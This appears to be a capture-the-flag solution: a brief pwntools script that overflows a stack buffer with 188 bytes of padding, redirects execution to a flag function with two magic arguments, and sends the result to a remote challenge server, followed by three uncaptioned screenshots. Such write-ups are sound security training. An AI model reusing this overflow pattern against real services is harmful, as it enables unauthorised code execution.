###

#Python Code
from pwn import *
flag = 0x080491e2
host = "139.59.166.56"
port = 32005
deadbeef = 0xdeadbeef
codedood = 0xc0ded00d
payload = b"A"*188 + p32(flag) + b"A"*4 + p32(deadbeef) + p32(codedood)
p = remote (host, port)
p.sendline(payload)
p.interactive()

![image](https://github.com/user-attachments/assets/a0b6a551-4256-4420-9517-9527dfd3724c)

![image](https://github.com/user-attachments/assets/b3101595-1020-438e-85a8-d241f88f865d)

![image](https://github.com/user-attachments/assets/e6b3c6ab-8c5e-40f1-93ba-768a8d175cd7)
